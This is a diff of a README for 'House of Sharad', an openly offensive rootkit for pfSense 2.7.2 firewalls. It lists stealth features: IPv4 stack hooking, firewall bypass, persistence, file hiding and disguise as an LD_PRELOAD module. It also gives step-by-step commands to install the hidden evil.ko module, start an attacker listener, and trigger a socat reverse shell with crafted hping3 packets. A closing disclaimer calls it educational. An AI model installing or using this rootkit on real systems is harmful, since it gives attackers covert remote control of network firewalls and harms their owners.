@@ -1,34 +1,81 @@
-First off, I would like to give a massive thank you to my friend Sharad(mineo333) for helping 
-create the functionality of forking a process and running kern_execve() in the child.  This is the
-core of the entire rootkit and what allows for code execution upon the condition of a packet
-with a certain source port being seen.  I could not have done this without his help.
+House of Sharad - pfSense Rootkit
 
-Secondly, the functionality that hides file is completely 1 for 1 ripped from BlueDragonSecurity's(bluedragonsecurity) repo bds_freebsd.  Big thanks for making this. 
+🚀 Overview
 
-An important note, the current .ko files are only usable for pfSense 2.7.2 CE.
-You to compile these yourself, you must do it within a pfSense box, NOT a compatable freeBSD kernel.
-To be able to compile within pfSense you must follow the steps outlined in "extra/how_to_setup_pfsense_to_compile.txt".
+House of Sharad is a pfSense rootkit that hooks into the IPv4 stack, allowing for stealthy reverse shells by detecting specially crafted packets.
 
-The "extra" directory holds the C code and Makefile to create an LKM that will eternally just print's a face, normal input will still work on the terminal it jsut scrolls really fast, you can also just unload it to make it stop. To load it you must run
+🔥 Huge Thanks
+
+First and foremost, a massive thank you to my friend Sharad (mineo333) for helping implement the core functionality of forking a process and executing kern_execve() in the child. This is what enables command execution when a packet with a specific source port is detected. This rootkit wouldn't be possible without his help.
+
+Additionally, the file-hiding functionality is directly borrowed from BlueDragonSecurity's (bluedragonsecurity) bds_freebsd project. Huge thanks for this work!
+
+📌 Compatibility
+
+The precompiled .ko files are only compatible with pfSense 2.7.2 CE.
+
+If you need to compile them yourself, you must do so within a pfSense environment (not just a compatible FreeBSD kernel).
+
+Follow the setup guide: extra/how_to_setup_pfsense_to_compile.txt.
+
+🛠️ Features
+
+✅ Hooks into pfSense’s IPv4 stack for stealthy reverse shell execution
+
+✅ Bypasses firewall rules (even if attacker IP/port is blocked)
+
+✅ Persistent LKM-based rootkit
+
+✅ File hiding functionality
+
+✅ Uses socat for reliable reverse shells (FreeBSD’s nc lacks reverse shell support)
+
+🏗️ Installation
+
+1️⃣ Cloning and Setup
+
+# Clone the repository
+git clone https://github.com/Mon-keyBoy/house_of_sharad.git
+cd house_of_sharad
+
+# Set execution permissions
+chmod +x load_and_setup.sh
+
+# Run the setup script
+./load_and_setup.sh
+
+Once the script completes, you'll be inside a ghost /Apekit-tooshit directory. To return to root, run:
+
+cd /
+
+2️⃣ Loading the Rootkit
+
 kldload /boot/modules/.evil/evil.ko
 
-ldpreload/LD_PRELOAD is a false name used for the rootkit since this LKM does not exist within pfSense but appears normal.
+🛡️ Getting a Reverse Shell
 
-This LKM/Rootkit has persistance, from apeshit.sh, which is loaded via load_and_setup.sh.
+1️⃣ Start a Listener
 
-To load the Rootkit you must clone this directroy, cd into it, chmod +x load_and_setup.sh, and run ./load_and_setup.sh.
-You will be popped out into a ghost /Apekit-tooshit directory so run cd / after the script is done.
+On your attacking machine, open a terminal and start a listener:
 
-What does it do?
-This Rootkit registers a custom hook to the top of the IPv4 head within pfSense and establishes reverse shells by forking the process that runs cat and running the reverse shell command in that fork with execve.
-This is super duper mega awesome because even if firewall rules are made against the attacker IP, ports, anything.  The registered hook will still receive the packet and make a reverse shell.
-We use socat to make the reverse shell since FreeBSD's native version of nc (netcat) doesn't allow for reverse shells.
+nc -lvnp 7000
 
-To get a reverse shell!
+2️⃣ Trigger the Reverse Shell
 
-Run "nc -lvnp 7000" on the attaking machine in a terminal.
-In another terminal, send packets that will pop open a reverse shell with the command
-"sudo hping3 -S -p <destination port> -s 6969 <ip of victim box>", 80 is a good choice for dest port
-Once you see the reverse shell connect, run control + c in the terminal that is sending the packets (you do not need to keep sending more traffic).
-If the reverse shell doesn't connect after about 5 packets then run control + c in the terminal that is sending packets and re-run the command, packet filtering is finickey and sometimes you need to try a couple times.
+In another terminal, send packets that will activate the rootkit:
+
+sudo hping3 -S -p 80 -s 6969 <TARGET_IP>
+
+🔹 Port 80 is a good choice for the destination port.
+🔹 If the shell doesn’t connect after ~5 packets, press Ctrl + C and re-run the command (packet filtering can be finicky).
+
+🧩 Additional Notes
+
+Persistence: This rootkit is loaded via apeshit.sh, which is executed by load_and_setup.sh.
+
+LD_PRELOAD Misdirection: The rootkit falsely appears as an LD_PRELOAD-related module, even though it’s an LKM.
+
+Extra Fun: The extra/ directory contains a simple LKM that prints a face endlessly to the terminal (input still works, but it scrolls rapidly). To stop it, simply unload the module.
+
+⚠️ Disclaimer: This project is for educational and research purposes only. Unauthorized use may be illegal. The author takes no responsibility for misuse.
 
